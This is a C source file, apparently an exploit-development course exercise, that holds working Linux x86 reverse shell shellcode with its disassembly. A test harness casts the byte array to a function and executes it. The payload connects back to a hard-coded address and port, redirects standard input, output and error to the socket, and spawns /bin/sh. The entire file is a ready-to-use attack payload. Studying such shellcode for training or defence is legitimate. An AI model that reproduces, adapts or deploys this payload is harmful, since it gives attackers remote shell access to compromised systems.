/*
Title:      Linux x86 TCP Reverse Shell - 79 bytes (NULL Free)
Author:     Amine Kanane <aminekanane_93@hotmail.com>
Student-ID: SLAE - 1203
Desc:       Spawn command shell after Connecting back to the attacker
Tested on:  Linux/x86 - SMP Debian 4.9.30-1kali1
Date:       10 May 2018

Disassembly of section .text:

08048060 <_start>:
 8048060:	31 db                	xor    ebx,ebx
 8048062:	31 c9                	xor    ecx,ecx
 8048064:	f7 e1                	mul    ecx
 8048066:	66 b8 67 01          	mov    ax,0x167
 804806a:	b3 02                	mov    bl,0x2
 804806c:	b1 01                	mov    cl,0x1
 804806e:	cd 80                	int    0x80
 8048070:	89 c3                	mov    ebx,eax
 8048072:	31 c0                	xor    eax,eax
 8048074:	66 b8 6a 01          	mov    ax,0x16a
 8048078:	68 0a bc f2 fe       	push   0xfef2bc0a
 804807d:	66 68 24 e3          	pushw  0xe324
 8048081:	66 6a 02             	pushw  0x2
 8048084:	89 e1                	mov    ecx,esp
 8048086:	b2 10                	mov    dl,0x10
 8048088:	cd 80                	int    0x80
 804808a:	31 c9                	xor    ecx,ecx
 804808c:	b1 02                	mov    cl,0x2

0804808e <loop_dup>:
 804808e:	b0 3f                	mov    al,0x3f
 8048090:	cd 80                	int    0x80
 8048092:	fe c9                	dec    cl
 8048094:	79 f8                	jns    804808e <loop_dup>
 8048096:	31 c0                	xor    eax,eax
 8048098:	50                   	push   eax
 8048099:	89 e2                	mov    edx,esp
 804809b:	68 2f 2f 73 68       	push   0x68732f2f
 80480a0:	68 2f 62 69 6e       	push   0x6e69622f
 80480a5:	89 e3                	mov    ebx,esp
 80480a7:	50                   	push   eax
 80480a8:	53                   	push   ebx
 80480a9:	89 e1                	mov    ecx,esp
 80480ab:	b0 0b                	mov    al,0xb
 80480ad:	cd 80                	int    0x80

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = "\x31\xdb\x31\xc9\xf7\xe1\x66\xb8\x67\x01"
                       "\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x31\xc0"
                       "\x66\xb8\x6a\x01\x68"
                       "\x0a\xbc\xf2\xfe" // => IP Address = (hex(struct.unpack("<L", socket.inet_aton("10.188.242.254"))[0])).strip('L')
                       "\x66\x68"
                       "\x24\xe3" // ==> port number = 9443; sock_ad.sin_port = htons(9443);
                       "\x66\x6a\x02\x89\xe1\xb2\x10"
                       "\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80"
                       "\xfe\xc9\x79\xf8\x31\xc0\x50\x89\xe2\x68"
                       "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
                       "\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";



main()
{
	printf("Shellcode Length: %d\n", strlen(code));

	int (*ret)() = (int(*)())code;
	ret();
}
